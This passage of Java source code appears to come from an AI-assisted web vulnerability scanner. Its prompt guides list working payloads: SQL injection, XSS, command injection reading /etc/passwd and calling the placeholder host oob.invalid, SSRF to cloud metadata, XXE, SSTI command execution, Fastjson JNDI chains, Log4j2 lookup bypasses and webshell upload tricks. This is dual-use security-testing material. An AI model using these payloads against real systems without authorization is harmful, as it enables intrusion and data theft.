                + "2. URL 里不能原样出现的字符也会编（引号、花括号、方括号、尖括号、反斜杠、^、`、|、空格、中文），"
                + "因为服务器会直接以 400 拒绝这类请求 —— 所以 {\"@type\":\"…\"}、[ ] 这种 JSON 载荷**直接写**，"
                + "不要自己先编码；URL 查询位置的空格会变成 +；\n"
                + "3. 合法的百分号转义（%27、%252F、%2e）原样保留，裸 % 会被编成 %25 —— "
                + "所以 OGNL 的 %{...}、SQL 的 LIKE '%' 都直接写，不要自己先编码。\n"
                + "另外**不要**自己用 + 代替空格 —— 那个 + 会被编码成 %2B，服务端收到的是字面加号，载荷当场失效。\n\n";
    }
    
    private String buildStep3UserPrompt(ScanTask task, String requestInfo, JsonObject step2Result, List<String> validParamNames) {
        StringBuilder sb = new StringBuilder();
        sb.append("【待测试的HTTP请求】\n\n");
        sb.append(requestInfo);
        sb.append("\n\n【参数-漏洞映射（paramVulnMap）】\n");
        
        JsonArray paramVulnMap = step2Result.has("paramVulnMap") ? step2Result.getAsJsonArray("paramVulnMap") : null;
        if (paramVulnMap != null && paramVulnMap.size() > 0) {
            sb.append("[\n");
            for (int i = 0; i < paramVulnMap.size(); i++) {
                JsonObject mapping = paramVulnMap.get(i).getAsJsonObject();
                String param = safeGetString(mapping, "param", "");
                JsonArray vulnTypes = mapping.has("vulnTypes") ? mapping.getAsJsonArray("vulnTypes") : null;
                String reason = safeGetString(mapping, "reason", "");
                sb.append("  {\"param\": \"").append(param).append("\", ");
                if (vulnTypes != null && vulnTypes.size() > 0) {
                    sb.append("\"vulnTypes\": [");
                    for (int j = 0; j < vulnTypes.size(); j++) {
                        sb.append("\"").append(vulnTypes.get(j).getAsString()).append("\"");
                        if (j < vulnTypes.size() - 1) sb.append(", ");
                    }
                    sb.append("], ");
                }
                sb.append("\"reason\": \"").append(reason).append("\"}\n");
                if (i < paramVulnMap.size() - 1) sb.append(", ");
            }
            sb.append("]\n");
        } else {
            sb.append("(无有效映射)\n");
        }
        
        // 目标后端语言：模型的载荷示例是分语言的（文件上传尤其明显 —— 指南里 PHP 的
        // <?php echo 123;?> 最显眼），而它看到响应头也不一定会主动去推。这里替它推好，
        // 用一行显式结论写进提示词。（指纹只是线索，措辞里特意说了「不确定就多语言各试一条」，
        // 免得推错时反而把别的语言一刀切掉。）
        String stack = detectBackendStack(task == null ? null : task.getOriginalResponseBytes());
        sb.append("\n【目标指纹】").append(stack.isEmpty()
                ? "未能从响应里识别出后端语言 —— 选载荷语言时不要只出一种，PHP / Java(.jsp) / .NET(.aspx) 各出几条"
                : "检测到后端为 " + stack + " —— 选载荷的语言形态时优先按它来（例如文件上传优先用该语言的可执行后缀与脚本内容，不要默认 PHP）");
        sb.append("。指纹只是线索，拿不准就多语言各试一条。\n");

        sb.append("\n请根据上述映射，为每个参数-漏洞组合生成 ").append(PAYLOAD_COUNT_PER_COMBO)
          .append(" 条测试payload（1条探测 + 4条主攻 + 4条WAF绕过）。");
        return sb.toString();
    }

    /**
     * 从 step1 的响应里推目标后端语言，给载荷选型用（文件上传最需要：PHP/JSP/ASPX 的后缀和
     * 脚本内容都不一样，而指南里最显眼的例子是 PHP 的，模型整轮只出 .php 是常见结果）。
     *
     * <p>只看**确定性信号**，不做猜测：
     * <ul>
     *   <li>{@code X-Powered-By: PHP} / {@code PHPSESSID} → PHP</li>
     *   <li>{@code JSESSIONID} / Server 含 tomcat|jetty|undertow|weblogic|websphere / 页面里有
     *       Tomcat 或 Spring 的报错页 → Java</li>
     *   <li>{@code ASP.NET_SessionId} / {@code X-AspNet-Version} / Server 含 IIS → .NET</li>
     * </ul>
     *
     * <p>**故意不把 {@code Server: nginx} / {@code Server: Apache} 当作 PHP**：那只是前置的 web
     * 服务器，后面挂 Java、.NET 都很常见。把「nginx」读成「PHP」会让整轮载荷打错语言 ——
     * 宁可返回空串（提示词里会转成「各语言都试」），也不要给一个会误导的结论。
     *
     * @return 中文短语（如 {@code "Java（Tomcat / JSESSIONID）"}）；看不出来时返回空串
     */
    static String detectBackendStack(byte[] responseBytes) {
        if (responseBytes == null || responseBytes.length == 0) {
            return "";
        }
        String text = new String(responseBytes, StandardCharsets.UTF_8);
        String lower = text.toLowerCase(Locale.ROOT);
        if (lower.contains("x-powered-by: php") || lower.contains("phpsessid")
                || lower.contains("thinkphp") || lower.contains("laravel")) {
            return "PHP";
        }
        if (lower.contains("jsessionid") || lower.contains("x-powered-by: servlet")
                || lower.contains("apache tomcat") || lower.contains("apache-coyote")
                || lower.contains("whitelabel error page") || lower.contains("jboss")
                || lower.contains("jetty") || lower.contains("weblogic") || lower.contains("websphere")
                || lower.contains("struts")) {
            return "Java（Tomcat/JSP）";
        }
        if (lower.contains("asp.net_sessionid") || lower.contains("x-aspnet-version")
                || lower.contains("x-aspnetmvc-version") || lower.contains("microsoft-iis")
                || lower.contains("server: iis")) {
            return ".NET（IIS/ASPX）";
        }
        return "";
    }
    
    private JsonObject normalizeStep2Response(String content, List<String> validParamNames, byte[] requestBytes) {
        if (content == null || content.trim().isEmpty()) {
            return null;
        }
        
        try {
            String jsonStr = extractJsonFromContent(content);
            if (jsonStr == null || jsonStr.trim().isEmpty()) {
                return null;
            }
            
            JsonObject json = this.parseAiJson(jsonStr);
            if (json == null) {
                return null;
            }
            
            JsonObject result = new JsonObject();
            result.addProperty("analysis", safeGetString(json, "analysis", "参数分析完成"));
            
            JsonArray paramVulnMap = new JsonArray();
            List<String> droppedParams = new ArrayList<String>();
            JsonArray sourceMap = asArrayLenient(json.get("paramVulnMap"));
            
            if (sourceMap != null && sourceMap.size() > 0) {
                for (JsonElement elem : sourceMap) {
                    if (elem.isJsonObject()) {
                        JsonObject mapping = elem.getAsJsonObject();
                        String param = safeGetString(mapping, "param", "");
                        
                        if (param == null || param.isEmpty()) {
                            continue;
                        }
                        
                        // 只留下「真能注入」的参数：请求里真实存在的参数名，或与 step3 同一套判据认可的
                        // 位置写法（header:名称 / 裸白名单头 / URL_PATH[n] / BODY / body 里真实存在的位置）
                        // —— 直接复用 isValidPosition，两个阶段对 position 的认可范围必须完全一致。
                        // 此前这里只认 Burp 报出来的参数名，而 burp.IParameter 里根本没有「请求头」和
                        // 「路径段」（只有 PARAM_URL/BODY/COOKIE/XML/XML_ATTR/MULTIPART_ATTR/JSON），
                        // 于是模型按提示词第 4、6 条给出的 header:X-Forwarded-For、URL_PATH 映射
                        // 在这里被整条丢掉：step3 再也看不到它们，一个包都不发，
                        // 请求头与路径注入点等于全线失守（任务还会以「安全」结束，用户看不出原因）。
                        if (validParamNames != null && !validParamNames.isEmpty()
                                && !isValidPosition(param, validParamNames, requestBytes)) {
                            droppedParams.add(param);
                            continue;
                        }
                        
                        // 宽容读：这里是**模型原始 JSON**，不是规范化之后的对象 —— 写成
                        // "vulnTypes":"SQL注入"（字符串而非数组）是常见走样，用会抛的 getAsJsonArray
                        // 会让整份回复作废、任务记成「分析失败」且一个包都不发。
                        // 规范化之后的 paramVulnMap/vulnTypes 一定是数组，后面几处读点不必再宽容。
                        JsonArray vulnTypes = asArrayLenient(mapping.get("vulnTypes"));
                        if (vulnTypes == null || vulnTypes.size() == 0) {
                            continue;
                        }
                        
                        JsonArray filteredVulnTypes = new JsonArray();
                        for (JsonElement vt : vulnTypes) {
                            if (vt.isJsonPrimitive()) {
                                filteredVulnTypes.add(vt);
                            }
                        }
                        
                        if (filteredVulnTypes.size() == 0) {
                            continue;
                        }
                        
                        JsonObject filteredMapping = new JsonObject();
                        filteredMapping.addProperty("param", param);
                        filteredMapping.add("vulnTypes", filteredVulnTypes);
                        filteredMapping.addProperty("reason", safeGetString(mapping, "reason", ""));
                        paramVulnMap.add(filteredMapping);
                    }
                }
            }
            
            // 把「与部件名重复的属性映射」去掉：模型为同一个上传面同时写 file 与 filename 时，
            // 两条映射都会活下来（步骤 2 的注入点提示允许两种写法，step2/step3 的兜底判据两种都认），
            // 步骤 3 于是为同一个上传面各生成 9 条载荷。见 dedupMultipartAttributeMappings。
            List<String> duplicateParams = dedupMultipartAttributeMappings(paramVulnMap, requestBytes);
            if (!duplicateParams.isEmpty() && this.logPanel != null) {
                this.logPanel.logWarning(Msg.t("log.step2.droppedDuplicate",
                        duplicateParams.size(), String.join(", ", duplicateParams)));
            }

            // 丢了什么必须说出来：全部被丢时任务会以「AI 未发现值得测试的参数，本次不发包」结束，
            // 不记一笔的话用户只会以为 AI 什么都没看出来
            if (!droppedParams.isEmpty() && this.logPanel != null) {
                this.logPanel.logWarning(Msg.t("log.step2.dropped", droppedParams.size(), String.join(", ", droppedParams)));
            }
            result.add("paramVulnMap", paramVulnMap);
            return result;
            
        } catch (Exception e) {
            return null;
        }
    }
    
    /**
     * 载荷标记（{@code step3CommonRules} 里约定的 {@code kind}）的常量化：只认
     * probe/attack/bypass 三个值，其余一律返回 null = 「没标」。
     *
     * <p>宽容处理是必须的：这个字段的唯一用途是**否决**（别把一条明确不是探测载荷的载荷当作同组合
     * 对照），模型写中文、写布尔、或干脆不写，都不该让载荷本身被丢掉 —— 载荷的取舍由位置、类型、
     * 去重那几条规则决定，跟这个标记无关。
     */
    private static String normalizePayloadKind(String raw) {
        if (raw == null) return null;
        String value = raw.trim().toLowerCase(Locale.ROOT);
        if ("probe".equals(value) || "attack".equals(value) || "bypass".equals(value)) {
            return value;
        }
        return null;
    }

    private PayloadResult normalizeStep3Response(String content, List<String> validParamNames, byte[] requestBytes,
                                                 Set<String> mappedParams) {
        if (content == null || content.trim().isEmpty()) {
            return null;
        }
        
        try {
            String jsonStr = extractJsonFromContent(content);
            if (jsonStr == null || jsonStr.trim().isEmpty()) {
                return null;
            }
            
            JsonObject json = this.parseAiJson(jsonStr);
            if (json == null) {
                return null;
            }
            
            JsonArray testPayloads = new JsonArray();
            Set<String> seenPayloads = new HashSet<>();
            int unmappedCount = 0;
            JsonArray sourcePayloads = asArrayLenient(json.has("testPayloads")
                    ? json.get("testPayloads") : json.get("payloads"));
            
            int rawCount = sourcePayloads != null ? sourcePayloads.size() : 0;
            
            if (sourcePayloads != null && sourcePayloads.size() > 0) {
                for (JsonElement elem : sourcePayloads) {
                    if (elem.isJsonObject()) {
                        JsonObject payload = elem.getAsJsonObject();
                        String position = safeGetString(payload, "position", "");
                        
                        if (position == null || position.isEmpty() || position.equals("auto")) {
                            continue;
                        }
                        
                        // Validate position - filter out standard HTTP headers but allow injectable ones
                        // （与 Step2 用同一个判据 + 同一份请求字节：两阶段认可范围必须一致）
                        if (!isValidPosition(position, validParamNames, requestBytes)) {
                            continue;
                        }

                        // 只打 paramVulnMap 里列出的参数：模型有时会自行扩展到别的参数，
                        // 那等于对「AI 判断没有漏洞」的参数也发一遍 PoC（BODY 是整段 body 替换，不针对某个参数）
                        if (!isMappedPosition(position, mappedParams)) {
                            ++unmappedCount;
                            continue;
                        }
                        
                        String type = safeGetString(payload, "type", "UNKNOWN");
                        String payloadStr = safeGetString(payload, "payload", "");
                        // 载荷标记（probe/attack/bypass）。只认这三个值，其余（模型写中文、写 true、
                        // 干脆不写）一律当「没标」—— 它的用途只有一条：**否决**一条明确不是探测载荷的
                        // 载荷被当成同组合对照（见 AIEngine.recordProbeAnchor）
                        String kind = normalizePayloadKind(safeGetString(payload, "kind", null));

                        if (payloadStr == null || payloadStr.isEmpty()) {
                            continue;
                        }
                        
                        // Filter out payloads containing "paramName=" pattern
                        // AI should only generate values, not "param=value" format
                        // 例外：cookie 位置（header:Cookie）要的是完整 cookie 形态，尤其 Shiro 的
                        // rememberMe=<值> —— 替换整个 Cookie 头时带上 cookie 名是正确写法，
                        // 不是「回显参数」，按下面这条规则会被全量误杀
                        boolean cookieFormPayload = position != null
                                && (position.equalsIgnoreCase("cookie") || position.equalsIgnoreCase("header:cookie"))
                                && payloadStr.toLowerCase().startsWith("rememberme=");
                        String targetParamKey = normalizeParamKey(position);
                        // 另一类合法形态：multipart 请求里的部件/属性位置。改后缀只有两种写法 ——
                        // 载荷自带 filename="shell.php"（+ 空行 + 正文），或整段 part 形态
                        //（Content-Disposition: …）。这两种都天然含 filename= / name=，按下面那条规则
                        // 会被整条误杀 → 文件上传一条载荷都不剩 → 零发包 → 任务报「安全」。
                        // 整段 part 形态只在**请求本身就是 multipart** 时豁免，免得它在普通参数上变旁路。
                        boolean multipartFormPayload = isMultipartAttrKey(targetParamKey)
                                || (payloadStr.contains("Content-Disposition:") && isMultipartRequest(requestBytes));
                        // 只拿「本条载荷自己的目标参数」去查 name=value 形态（载荷该是值，不该带参数名）。
                        // 不能用**全部**参数名去查：multipart 的整段 part 载荷天然带 name="file"，
                        // 请求里只要有名为 name / filename 的参数，这类载荷就会被整条误杀 ——
                        // 文件上传会一条载荷都不剩（离线实测过）。
                        // 词边界：参数名短（如 a、id）时裸 contains 会把 data= 这类合法载荷误杀。
                        if (!cookieFormPayload && !multipartFormPayload && !targetParamKey.isEmpty()
                                && java.util.regex.Pattern
                                        .compile("(?<![A-Za-z0-9_])" + java.util.regex.Pattern.quote(targetParamKey) + "=")
                                        .matcher(payloadStr).find()) {
                            continue;
                        }

                        // 去重保留大小写差异：WAF 绕过指南推荐的正是大小写混合
                        // （SeLeCt、<ScRiPt>、shell.PhP），折叠大小写等于把这类手法自己砍掉
                        String dedupKey = position.toLowerCase() + ":" + type + ":" + payloadStr.trim();
                        if (seenPayloads.contains(dedupKey)) {
                            continue;
                        }
                        seenPayloads.add(dedupKey);
                        
                        JsonObject filteredPayload = new JsonObject();
                        filteredPayload.addProperty("type", type);
                        filteredPayload.addProperty("payload", payloadStr);
                        filteredPayload.addProperty("position", position);
                        // **这一行不能少**：下面是重建对象，只拷这三个键 ——
                        // 模型给了什么新键，不显式搬过来就等于当场丢掉（wafBypass 就是这么变成
                        // 纯提示词字段的：不是设计，是没搬）
                        if (kind != null) {
                            filteredPayload.addProperty("kind", kind);
                        }
                        testPayloads.add(filteredPayload);
                    }
                }
            }
            
            return new PayloadResult(rawCount, testPayloads, unmappedCount);
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private String getPayloadGuideForVulnType(ScanTask.ScanMode mode) {
        if (mode == null) return "";
        switch (mode) {
            case SQL_INJECTION:
                return "SQL注入payload：1. 单引号测试：' 2. 双引号测试：\" 3. UNION注入：' UNION SELECT NULL-- -、' UNION SELECT 1,2,3-- - 4. 布尔盲注：' AND 1=1-- -、' AND 1=2-- -（成对给出，靠响应差异判断） 5. 时间盲注（MySQL）：' AND SLEEP(6)-- -、' AND BENCHMARK(5000000,SHA1('test'))-- -（必须再给一条无延时对照 ' AND SLEEP(0)-- -，验证靠两次耗时对比，单看一次响应无法确认；睡眠秒数一律不超过 6 秒，单条测试请求 10 秒就超时，超时的载荷连耗时都拿不到） 6. 堆叠注入：'; SELECT SLEEP(6)-- - 7. 报错注入：' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- - 8. 恒真闭合：' OR '1'='1 9. 数字型（参数为整数时优先）：1 AND 1=1、1 AND 1=2、1 OR 1=1 10. 其它数据库的时间盲注（同一套耗时差值判据，都要配无延时对照）：SQL Server '; WAITFOR DELAY '0:0:6'-- -、PostgreSQL ' AND 1=(SELECT 1 FROM PG_SLEEP(6))-- -、Oracle ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',6)-- - 注意：MySQL 的 -- 注释要求第二个减号后面跟空白，所以统一写成 -- -（URL 参数位置会变成 --+-，解码后仍是 -- -）；只写 -- 在 MySQL 上是语法错误";
            case XSS:
                return "XSS payload：1. 基础标签：<script>alert(1)</script>、<script src=http://oob.invalid/xss.js></script>、<img src=x onerror=alert(1)>、<body onload=alert(1)> 2. 无括号/无空格变体（绕过滤）：<svg/onload=alert(1)>、<img src=x onerror=alert`1`>、<details open ontoggle=alert(1)>、<input onfocus=alert(1) autofocus> 3. 上下文突破（先闭合当前上下文再开标签，反射型最常用）：\"> <script>alert(1)</script>、'><img src=x onerror=alert(1)>、</title><script>alert(1)</script>、--><script>alert(1)</script> 4. JS 字符串/属性内突破：'-alert(1)-'、\";alert(1);//、\" onmouseover=alert(1) x=\" 5. 伪协议与 data：<a href=javascript:alert(1)>click</a>、<a href=data:text/html,<script>alert(1)</script>>click</a> 6. 判定口径：本工具不执行 JavaScript、也不二次访问存储点，所以证据只能是「载荷在本次响应里未编码地出现」。反射型当然算；**存储型要看它是不是在同一条响应里就渲染出来了** —— 留言板、评论、工单这类「提交后直接返回列表」的页面很常见，提交响应里就带着刚存进去的内容，这种和反射型一样能测，不要因为「它是存储型」就放弃（本工具的靶场就是这么设计的）；真正拿不到证据的是需要另发一次请求才能看到落库内容的那种，以及纯 DOM 型";
            case COMMAND_INJECTION:
                return "命令注入payload：1. 命令分隔符：;ls、;cat /etc/passwd、;pwd、;id 2. 管道符：|cat /etc/passwd、|ls -la、|whoami 3. 后台执行：&ls&、&&ls&& 4. 或逻辑：||ls、||cat /etc/passwd 5. 命令替换：$(cat /etc/passwd)、`cat /etc/passwd` 6. URL编码：%0Awhoami 7. 组合注入：;cat /etc/passwd|grep root 8. 无回显外带（DNS 最通用：只要目标解析该域名就算回连成功，不需要带回命令输出，也不要拼接 whoami/hostname）：;nslookup oob.invalid（Linux）、|nslookup oob.invalid（Windows）、Linux 用 ;curl http://oob.invalid/x、Windows cmd 的分隔符是 & 不是 ;，要写 & curl http://oob.invalid/x（HTTP 外带要求目标能出 TCP）；改用 ping 时必须带超时且两个平台参数不同（Linux -c 1 -W 2 / Windows -n 1 -w 2000），写错只会报错、不会发起解析 9. 时间盲注（无回显、又出不了网时的第二条路，注意单条请求 10 秒超时）：;sleep 6（Linux）、& ping -n 6 127.0.0.1 >nul（Windows，约 5 秒）—— **Windows 上不要用 timeout /t 6**：它需要交互式控制台，web 服务拉起的 cmd 里 stdin 不是终端，会立刻回一句 Input redirection is not supported 然后退出，**一点延时都没有**，这条载荷在真实目标上恒为假阴性；必须再给一条无延时对照（Linux ;sleep 0、Windows & ping -n 1 127.0.0.1 >nul），判定看耗时差值，睡眠秒数不要超过 6";
            case FILE_UPLOAD:
                return "文件上传payload（**改后缀只有两种可用形态**：① position 指向文件字段（如 file），载荷里带上 filename= 声明，例如 filename=\"shell.php\"（后面可再跟一个空行 + 文件正文）；② 整段 part 形态，payload 以 Content-Disposition: 开头。**只给裸文件名（shell.php）不会改文件名** —— 程序只会把它写进 part 的内容里，后缀没变，等于白打一条。下面的后缀请按目标后端语言替换，PHP/ASP/ASPX/JSP 各有一套）：\n"
                        + "0. **先按上面给出的目标指纹定语言**（没给指纹就 PHP / Java / .NET 各出几条，整轮只出 .php 是错的）。三种语言的无害脚本探针：PHP → <?php echo 123;?>；Java(JSP) → <% out.println(123); %>；.NET(ASPX) → <%@ Page Language=\"C#\" %><% Response.Write(123); %>\n"
                        + "1. 可执行后缀：PHP → shell.php、shell.php3、shell.php5、shell.php7、shell.phtml、shell.phar；Java → shell.jsp、shell.jspx、shell.jspf；.NET → shell.asp、shell.aspx、shell.ashx、shell.asmx、shell.soap\n"
                        + "2. 后缀混淆：shell.pHp、shell.PhP5、shell.pphphp（双写）、shell.php.、shell.php;.jpg、shell.php%00.jpg（老版本 PHP 空字节截断）\n"
                        + "3. 双扩展名与路径：shell.jpg.php、shell.php.jpg、shell.php.png、../shell.php（路径穿越）、.shell.php（隐藏文件）\n"
                        + "4. 仅 Windows/IIS：shell.php::$DATA（NTFS 数据流）、shell.asp;.jpg（分号截断）、con.php / aux.asp（保留设备名）、后缀带尾随空格或点号\n"
                        + "5. 只改文件内容（保留原文件名，payload 就是文件内容）：<?php echo 123;?>、<% out.println(123); %>、<%@ Page Language=\"C#\" %><% Response.Write(123); %>、GIF89a<?php echo 123;?>（魔术字节 + 脚本，配 .php 后缀用）\n"
                        + "6. 整段替换文件字段（payload 必须以 Content-Disposition: 开头，内部换行在 JSON 里写成 \\r\\n 转义——解析后就是真实换行；请求体含二进制 part 时只有这种形态可用）：Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\\r\\nContent-Type: image/png\\r\\n\\r\\n<?php echo 123;?>\n"
                        + "7. 配置文件上传（filename 就是配置文件名，内容是配置）：PHP/Apache → .htaccess（SetHandler 把指定后缀当 PHP 解析）、.user.ini（auto_prepend_file=shell.jpg）；.NET/IIS → web.config（handlers 把 .jpg 当 aspx 执行）、Global.asax\n"
                        + "8. 类型校验绕过：Content-Type: image/png 配 .php 后缀、Content-Type: application/x-php、双 Content-Type 头\n"
                        + "9. filename 参数异常：两个 filename 参数、filename=\"\"（空）、引号不闭合、filename 里塞换行\n"
                        + "注意：上传内容用**与后缀语言一致**的无害载荷（.php 配 <?php echo 123;?>、.jsp 配 <% out.println(123); %>、.aspx 配 <%@ Page Language=\"C#\" %><% Response.Write(123); %>）—— 后缀换了语言、内容还是 PHP，等于白打一条；不要上传真实后门；判定看响应是否泄露保存路径或回显文件内容，「上传成功」四个字不构成证据；上面第 1~4、8、9 条的「后缀」都要按①的形态写成 filename=\"后缀\"（想同时放脚本就在空行后跟一行 <?php echo 123;?>），第 5 条是纯内容形态、第 6 条是整段 part 形态";
            case SSRF:
                return "SSRF payload：1. 本地地址：http://127.0.0.1:80、http://localhost:80 2. 内网地址（必须是单个可访问地址，不要写网段）：http://10.0.0.1、http://192.168.1.1、http://172.16.0.1 3. 云元数据：http://169.254.169.254/latest/meta-data/ 4. 协议变换：gopher://127.0.0.1:6379/_、dict://127.0.0.1:6379/info（只有本次响应回显了内部服务内容才算证据，gopher/dict 打出去通常看不到回显） 5. URL变体：http://127.1、http://[::1]、http://2130706433、http://0x7f000001 6. @符绕过：http://google.com@127.0.0.1 7. DNS重绑定：http://127.0.0.1.example.com 8. 伪协议读文件：file:///etc/passwd 9. 出网验证（盲 SSRF 的唯一证据）：http://oob.invalid/ —— 目标服务器只要解析了这个域名，就说明请求真的是它发出去的；内网地址那几条拿不到回显时，都换成这条重打一遍 10. 白名单绕过（目标只允许访问固定域名时最有效的一条）：借目标自己域上的开放重定向 —— http://目标自己的域/redirect?url=http://169.254.169.254/latest/meta-data/ ，只要重定向后的地址没做二次校验，内网就通了；登录跳转、分享链接跳转、图片代理这类接口都可以试，找不到已知的跳转接口就把第 6、7 条（@符、DNS重绑定）也一并打上";
            case XXE:
                return "XXE payload（这些是完整 XML 文档，position 必须填 BODY）：1. 经典读文件（回显型，最直接）：<?xml version=\"1.0\"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo> 2. 盲 XXE · OOB 出网（读不到回显时的唯一证据）：<!DOCTYPE foo[<!ENTITY % xxe SYSTEM \"http://oob.invalid/evil.dtd\">%xxe;]><foo>test</foo> —— 解析器会去取这个 DTD，即使它不存在（404），请求也已经发出去了，回连记录就是证据 3. 参数实体二段式（部分解析器只在参数实体上下文中求值）：<!DOCTYPE foo[<!ENTITY % a SYSTEM \"http://oob.invalid/1.dtd\">%a;]><foo>test</foo> 4. DOCTYPE 直接声明 SYSTEM（WAF 只查实体名时有效）：<!DOCTYPE foo SYSTEM \"http://oob.invalid/evil.dtd\"><foo>test</foo> 5. XInclude（目标不接受 DOCTYPE 时唯一的入口）：<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo> 6. XXE 走 SSRF 读云元数据：<!DOCTYPE foo[<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo> 注意：**不要**写「在内部子集的实体值里引用参数实体」那种载荷（<!ENTITY % e \"<!ENTITY &#x25; send SYSTEM 'http://.../?%f;'>\">）—— 那是非法 XML，解析器会直接报错、永远不会有回连；把文件内容读出来再外带需要我们自己托管 DTD，本工具不提供。http://oob.invalid 是回连域名占位符";
            case SSTI:
                return "SSTI payload：1. Jinja2：{{7*7}}、{{config}}、{{self}}、{{''.__class__.__mro__[1].__subclasses__()}} 2. Twig：{{7*7}}、{{_self.env.include}} 3. FreeMarker：${7*7}、<#assign ex=\"freemarker.template.utility.Execute\"?new()> 4. Velocity：#set($x=$class.inspect('java.lang.Runtime').getRuntime().exec('id')) 5. Smarty：{php}echo `id`;{/php} 6. Handlebars：{{#with \"as\"}}{{#with \"ex\"}}../../etc/passwd{{/with}}{{/with}} 7. 模板语法测试：${7*7}、#{7*7} 8. 代码执行：{{request.application}} 9. Thymeleaf（Spring Boot 上最主流的那个，别只试 FreeMarker）：__${7*7}__::.x（预处理表达式 + 片段表达式，参数被当作视图名/模板片段时求值）、[[${7*7}]]（内联表达式，直接写进被渲染的模板里）10. **先定引擎再选利用链**：把 {{7*7}} 和 {{7*'7'}} 成对发出 —— 两个都回显 49 → Twig（PHP，* 在数值上下文里就是乘法）；{{7*'7'}} 回显 7777777 → Jinja2（Python，字符串乘数字就是重复）。这一对能把引擎定下来，比逐个试语法快得多";
            case FASTJSON:
                return "Fastjson payload（这些是完整 JSON 文档，position 一般填 BODY；绑定实体、嵌套字段时才用参数位置）：1. 最新 AutoType 绕过（CVE-2026-16723，2026-07 披露，影响 1.2.68~1.2.83：默认配置即可利用、不需要第三方 gadget，条件是 Spring Boot fat-JAR 部署且目标能出网）：{\"@type\":\"jar:http://oob.invalid/evil.jar!/com/example/Evil\"} —— 目标会去拉这个 URL、把带 @JSONType 注解的类当可信类加载，这条载荷本身就会对我们域名产生一次 HTTP/DNS 请求 2. 经典 DNS 探测（不需要任何 gadget，有回连就说明 AutoType 走到了解析）：{\"@type\":\"java.net.Inet4Address\",\"val\":\"oob.invalid\"}、{\"@type\":\"java.net.URL\",\"val\":\"http://oob.invalid/\"} 3. JNDI 出网（先用 java.lang.Class 把类塞进缓存再引用它，autoType 关着也能用）：3a 数组形态：[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://oob.invalid/x\",\"autoCommit\":true}]；3b **同序兄弟键的对象形态**（接口只收 JSON 对象、数组会被 400 拒绝时用这条，两个键的先后顺序不能反）：{\"m\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://oob.invalid/x\",\"autoCommit\":true}} 4. 嵌套在真实字段里（parseObject(body, Dto.class) 绑定实体、DTO 里有 Object/Map 字段时同样能打）：{\"id\":1,\"data\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"oob.invalid\"}}（**接口把 body 绑定到实体时这一条比顶层裸 @type 更管用**：顶层写 {\"@type\":\"java.net.Inet4Address\",…} 会报 type not match … -> 实体类；即使实体里没有 data 这个字段，值里的 @type 一样会被反序列化，实测有效） 5. 1.2.68~1.2.80 的 AutoCloseable 绕过（需要 classpath 上有对应依赖才成立）：{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.collections.functors.ConstantTransformer\"} 6. 报错型辅助（判版本、判是否被 SafeMode 拦住，不作为证据）：{\"@type\":\"com.example.NotExist\"} 注意：只用 DNS/HTTP 外带型载荷取证，不要准备或上传可执行 JAR；响应里的 autoType is not support、JSONException 只是辅助信息，回连记录才构成证据";
            case LOG4J2:
                return "Log4j2 payload（纯文本即可，不必是完整 JSON；注入点要选会被写进日志的值：参数、header:User-Agent、header:X-Forwarded-For、header:Referer、header:Cookie、JSON 字段）：1. DNS 外带（首选：目标能出 DNS 就会回连，不需要我们准备 LDAP 服务）：${jndi:dns://oob.invalid}（dns:// 后面不带路径 —— DNS 只解析主机名，带路径的形态在部分 JNDI 实现里会把路径并进查询名） 2. LDAP/RMI 外带（JNDI 会先解析 URL 主机名，所以即使没有 LDAP 服务也能靠回连确认）：${jndi:ldap://oob.invalid/x}、${jndi:rmi://oob.invalid/x} 3. 关键字过滤绕过（2.15.0 起对 jndi 关键字做过滤，以下都在公开绕过清单里）：${${lower:j}ndi:dns://oob.invalid}、${${upper:j}ndi:dns://oob.invalid}、${j${lower:n}di:dns://oob.invalid}、${${::-j}${::-n}${::-d}${::-i}:dns://oob.invalid}、${${env:NaN:-j}ndi:dns://oob.invalid}、${jndi:${lower:d}${lower:n}${lower:s}://oob.invalid/x} 4. 分段与拼接：${jndi:dn${::-s}://oob.invalid/x}、${${date:'j'}ndi:dns://oob.invalid} 5. 多注入点覆盖：同一个域名分别放进 header:User-Agent、header:X-Forwarded-For、header:Referer、header:X-Api-Version，以及 username/name/keyword/query 这类会被记日志的参数 6. 判定依据：回连记录里出现我们的域名 = lookup 真的被解析（log4j-core 2.0-beta9~2.14.1 上这等于可 RCE）；响应里原样回显 ${jndi:...}、或只是 500/报错，都不算证据 注意：不要用 ${env:...}/${sys:...} 读配置，也不要真的触发 JNDI 远程加载";
            case STRUTS2:
